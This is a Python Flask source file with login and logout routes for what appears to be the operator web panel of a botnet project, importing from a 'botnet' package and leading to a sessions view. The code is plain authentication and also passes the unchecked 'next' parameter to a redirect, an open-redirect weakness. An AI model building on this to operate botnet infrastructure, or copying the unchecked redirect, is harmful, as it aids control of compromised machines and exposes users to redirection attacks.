import os
from flask import (
	Blueprint, flash, redirect, render_template, 
	request, url_for, send_from_directory, session
)
from flask_bcrypt import check_password_hash
from flask_login import login_user, logout_user, current_user, login_required
from botnet.dao import user_dao
from web_gui.routes.user.forms import LoginForm

users = Blueprint('users', __name__)

@users.route("/login", methods=['GET', 'POST'])
def login():
	"""Log user in"""
	if current_user.is_authenticated:
		return redirect(url_for('root.sessions'))

	form = LoginForm()
	if form.validate_on_submit():
		user = user_dao.get_user(username=form.username.data)
		if user and check_password_hash(user.password, form.password.data):
			login_user(user)
			next_page = request.args.get('next')
			return redirect(next_page or url_for('root.sessions'))
		flash("Invalid username/password.")
	return render_template("login.html", form=form, title="Log In")


@users.route('/logout')
@login_required
def logout():
	"""Log out"""
	logout_user()
	return redirect(url_for('users.login'))
